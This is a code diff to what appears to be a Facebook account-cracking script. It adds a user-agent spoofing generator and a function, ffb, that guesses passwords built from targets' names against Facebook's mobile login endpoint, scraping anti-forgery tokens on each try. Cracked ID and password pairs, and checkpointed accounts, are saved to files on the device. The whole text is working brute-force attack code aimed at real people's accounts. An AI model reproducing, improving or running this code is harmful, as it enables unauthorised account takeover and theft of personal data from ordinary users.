@@ -97,7 +97,7 @@ os.system("rm -rf .f2")
 ugen=[]
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['Mozilla/5.0 (Linux; Android 10; itel W4001 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/330.0.0.10.108;]','Mozilla/5.0 (Linux; Android 8.1.0; Plume L1 Plus Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 8.1.0; Hisense U605 Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]','Mozilla/5.0 (Linux; Android 10; TECNO BC1 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 11; Premier5 Build/R01005; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.15.96;]','Mozilla/5.0 (Linux; Android 10; itel P681L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/333.0.0.12.108;]','Mozilla/5.0 (Linux; Android 10; SmartE11 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.11.99;]'])
+        b=random.choice(['6','7','8','9','10','11','12'])
         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
@@ -108,7 +108,7 @@ for agent in range(10000):
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
         l='Mobile Safari/533.1'
-        fullagnt=(f'{b}')
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 
 sim_id = ''
@@ -561,6 +561,44 @@ class crack_main():
                 print(50*'=')
                 input('\n Press enter to back ')
                 main()
+        def ffb(ids,name,passlist):
+                global loop,oks,cps
+                sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                session = requests.Session()
+                try:
+                        first = name.split(' ')[0]
+                        try:
+                                last = name.split(' ')[1]
+                        except:
+                                last = 'Khan'
+                        ps = first.lower()
+                        ps2 = last.lower()
+                        for fikr in passlist:
+                                pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+                                ua=random.choice(ugen)
+                                head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                                getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                                idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                                complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                                Aking=session.cookies.get_dict().keys()
+                                if "c_user" in Aking:
+                                        print('\r\r\033[1;32m [ZEE-OK] %s | %s'%(ids,pas))
+                                        open('/sdcard/zee_ok.txt', 'a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                                elif 'checkpoint' in Aking:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/zee_cp.txt', 'a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                                        else:
+                                                break
+                                else:
+                                        continue
+                except requests.exceptions.ConnectionError:
+                        time.sleep(20)
+                loop+=1
         def rndm(self,iid,name,passlist):
                 global loop
                 global ok
